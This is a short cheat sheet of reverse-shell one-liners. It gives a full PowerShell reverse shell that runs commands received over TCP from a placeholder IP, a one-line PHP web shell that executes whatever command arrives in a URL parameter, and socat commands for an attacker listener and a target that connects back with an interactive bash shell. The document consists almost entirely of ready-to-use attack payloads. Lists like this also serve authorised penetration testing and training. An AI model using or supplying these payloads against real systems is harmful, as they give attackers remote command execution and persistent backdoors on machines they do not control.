# reverse-shells
Reverse shells and one-liners

# Powershell
  * powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# PHP
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>

# Socat
  - Attacker:
```
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```
  - Target:
```
socat TCP:<attacker-ip>:<attacker-lport> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

